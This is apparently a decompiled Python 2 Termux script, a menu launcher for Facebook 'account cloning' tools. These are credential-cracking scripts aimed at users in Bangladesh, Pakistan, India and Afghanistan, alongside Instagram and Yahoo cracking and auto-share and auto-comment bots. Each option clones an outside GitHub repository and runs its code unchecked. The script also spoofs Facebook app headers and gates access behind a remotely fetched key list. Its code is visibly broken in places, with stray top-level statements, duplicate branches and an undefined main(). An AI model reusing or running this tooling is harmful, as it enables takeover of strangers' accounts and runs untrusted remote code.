# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: romi
import requests, bs4, sys, os, uuid, subprocess, sys, random, time, re, base64, json, requests, bs4, sys, os, uuid, subprocess, sys, random, time, re, base64, json
from multiprocessing.pool import ThreadPool
from datetime import datetime
from time import sleep
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'Nopember', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    os.system('pip2 install requests')
    os.system('python2 jmbf.py')

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
os.system('clear')
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
my_color = [
 O, U, B, K, H, M, P]
warna1 = random.choice(my_color)
my_color = [
 M, H, P, K, U, B, O]
warna2 = random.choice(my_color)
my_color = [
 U, O, K, P, H, K, B]
warna3 = random.choice(my_color)
__author__ = 'Mr.Jutt'
__copyright = 'All rights reserved . Copyright  Mr.Jutt'
try:
    os.mkdir('/sdcard/Jutt')
except OSError:
    pass

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def tik():
    titik = ['\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for o in titik:
        print '\r %s[%s+%s] Please wait %s' % (P, O, P, o),
        sys.stdout.flush()
        time.sleep(1)


def tod():
    titik = [
     '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ', '\x1b[1;92m.   ', '\x1b[1;93m..  ', '\x1b[1;96m... ']
    for x in titik:
        print '\r %s[%s\xc3\x97%s] Delete token %s' % (P, M, P, x),
        sys.stdout.flush()
        time.sleep(1)


IP = requests.get('https://api.ipify.org').text
logo = '  \n %s\xe2\x95\xa6\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90  \xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\xac \xe2\x94\xac\xe2\x94\xac \xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\xac  \xe2\x95\x94\xe2\x95\x97 \xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac \xe2\x94\xac\xe2\x94\x8c\xe2\x94\xac\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\n %s\xe2\x95\x91\xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x82  \xe2\x94\x82   \xe2\x95\x91\xe2\x95\x91\xe2\x95\x91\xe2\x94\x82 \xe2\x94\x82\xe2\x94\x82  \xe2\x94\x82 \xe2\x94\x82  \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x82 \xe2\x94\x9c\xe2\x94\xa4 \n%s\xe2\x95\x9a\xe2\x95\x9d\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 \xe2\x94\xb4  \xe2\x94\xb4   \xe2\x95\xa9 \xe2\x95\xa9\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4 \xe2\x94\xb4  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 \xe2\x94\xb4 \xe2\x94\x94\xe2\x94\x80\xe2\x94\x98 ' % (P, warna, P)
logo2 = '%s \n     ___  __   __  _______  _______ \n    |   ||  | |  ||       ||       |\n    |   ||  | |  ||_     _||_     _|\n    |   ||  |_|  |  |   |    |   |  \n ___|   ||       |  |   |    |   |  \n|       ||       |  |   |    |   |  \n|_______||_______|  |___|    |___|  \n          %s *%s JuttBadshah Brand %s*\n%s--------------------------------------------------\n' % (warna, O, H, O, N)
host = 'https://mbasic.facebook.com'
ua = 'Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64'
ips = None
try:
    b = requests.get('https://api.ipify.org').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; TECNO KE6j Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 GSA/11.42.18.23.arm64'}).json()['country_name'].lower()
except:
    ips = None

uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()

def reg():
    os.system('clear')
    print logo
    try:
        to = open('/data/data/com.termux/files/usr/libexec/coreutils/.apikey', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/MAHDI-Shuvo/new/main/mahdi.text').text
    if to in r:
        notice()
    else:
        os.system('clear')
        print logo
        print ''
        print '\t\t \x1b[4;31mApproved Failed'
        print ''
        print '\t%s    Your Api Is Not %sApproved' % (N, warna1)
        print ''
        print ' \t\x1b[1;92mCopy Your Api: \x1b[1;91m' + to
        print ''
        raw_input('\t\x1b[1;97m  And Press \x1b[1;91menter \x1b[1;97mto Input Api')
        os.system('xdg-open https://juttkey.000webhostapp.com/30day.php')
        time.sleep(5)
        print ''
        raw_input('\t\x1b[1;93m Press \x1b[1;96menter\x1b[1;93m To Check Approval ')
        os.system('xdg-open https://t.me/joinchat/3Ls9bUMjqpJkN2Jk')
        reg()


def reg2():
    os.system('clear')
    print logo2
    print '\t\t \x1b[4;31mApproval Not Detected'
    print ''
    print '\t%s   Your Api Is Not %sApproved' % (N, warna1)
    print ''
    id = uuid.uuid4().hex[:20]
    print ' \t\x1b[1;92mCopy Your Api: \x1b[1;91m' + id
    print ''
    raw_input('\t\x1b[1;97m  And Press \x1b[1;91menter \x1b[1;97mto Input Api')
    print ''
    os.system('xdg-open https://juttkey.000webhostapp.com/30day.php')
    time.sleep(5)
    sav = open('/data/data/com.termux/files/usr/libexec/coreutils/.apikey', 'w')
    sav.write(id)
    sav.close()
    raw_input('\t\x1b[1;93m Press \x1b[1;96menter\x1b[1;93m To Check Approval ')
    reg()


from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 
   'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')

def yayanxd():
    os.system('clear')
    print logo2
    print '\n %s[%s1%s] Login Cookis Facebook' % (P, O, P)
    print ' %s[%s2%s] Login Token Facebook' % (P, O, P)
    pilih()


def pilih():
    m = raw_input('\n [*] choose : ')
    if m == '':
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        os.system('clear')
        yayanxd()
    elif m == '1':
        os.system('clear')
        cokis()
    elif m == '2':
        token()
    else:
        print '\n %s[%s\xc3\x97%s] wrong input' % (N, M, N)
        time.sleep(1)
        os.system('clear')
        yayanxd()


def cokis():
    print logo2
print("""
\033[1;36m[1]CLONE FROM2006- 2009 ID
\033[1;32m[2]CLONE FROM 2009 ID 
\033[1;88m[3]CLONE FROM 2010-2020 ID
\033[1;33m[4]CLONE FROM  BANGLADESH 6DIG[All SIM]
\033[1;32m[5]CLONE FROM INSTRAGAM ID
\033[1;33m[6]CLONE FROM FRIENDLIST (NEED TOKEN)
\033[1;36m[7]CLONE FROM  PUBLICK ID v2
\033[1;32m[8]CLONE FROM ID BANGLADESH 11DIG[All SIM]
\033[1;33m[9]CLONE FROM NUMBER BD
\033[1;88m[10]CLONE FROM FREOM PAKISTAN 
\033[1;88m[11]CLONE FROM FROM INDIA
\033[0;33m[12]CLONE FROM AFGHANISTAN 
\033[0;88m[13]CLONE FROM FREOM PAKISTAN V2(All SIM)
\033[1;33m[14]CLONE FROM FREOM File Creating
\033[1;35m[15]CLONE FROM LATEST FB CRACKING LOGIN
\033[1;33m[16]CLONE FROM ID BANGLADESH 9DIG (All SIM)
\033[1;32m[17]CLONE FROM 2009 ID [MAO]
\033[1;37m[18]FB AUTO SHARE (need TOKEN)
\033[1;33m[19]FB AUTO COMMENT(need TOKEN)
\033[1;33m[20]CLONE YAHOO 
\033[1;36m[21]CLONE FROM  PUBLICK ID  (Best) v2
\033[1;36m[22]CLONE FROM  PUBLICK ID  (best) v2
\033[1;33m[23]CLONE FROM FREOM File Creating V
\033[1;36m[24]CLONE FROM2003- 2005 ID
""")
pil = input("\033[1;97m[\033[1;94m?\033[1;97m] CHOOSE: ")

if pil in ["01", "1"]:

    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 mahdi9.py')
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["02", "2"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python 20091st.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["03", "3"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["04", "4"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 BD6.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()



elif pil in ["05", "5"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && python instragam.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["06", "6"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    os.system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["07", "7"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python Prem.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["08", "8"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python2 BD11.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["09", "9"]:
    os.system('git clone https://github.com/Azim-vau/smbf.git && cd smbf')
    os.system('python2 smbf.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["10"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4 && python2 pakistan.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
	
	
elif pil in ["11"]:
    os.system('pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["12"]:

    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4 && python2 Mahadi-Afg.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()
elif pil in ["13"]:
    os.system('git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4')
    os.system('python mahdi2.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["14"]:
    os.system('git clone https:/github.com/James404-cyber/DUM-ID.git')
    os.system('cd DUM-ID && python Doubled.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    main()

elif pil in ["15"]:
    os.system('pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat')
    system('python Nx.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
    
elif pil in ["16"]:
    os.system('git clone https://github.com/Shuvo-BBHH/shuvook.git && cd shuvook && python2 bd9.py cvx')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["17"]:
    os.system('pip2 install mclone')
    os.system('mclone')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["18"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python mahdi.py')
    
elif pil in ["19"]:
    os.system('git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python autocomment.py')
  
	
elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python yahoo.py')	

elif pil in ["20"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python ')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	

elif pil in ["21"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Adf.py ')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
	
elif pil in ["22"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Juttbrand.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)	
elif pil in ["23"]:
    os.system('git clone https://github.com/Shuvo-BBHH/mall && cd mall && python2 file.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)
elif pil in ["24"]:
    os.system('git clone https://github.com/Shuvo-BBHH/texs && cd texs && python2 811.py')
    time.sleep(2)
    print(" ")
    n = input("[ \n\033[1;94mBACK \n\033[1;97m]")
    time.sleep(2)     
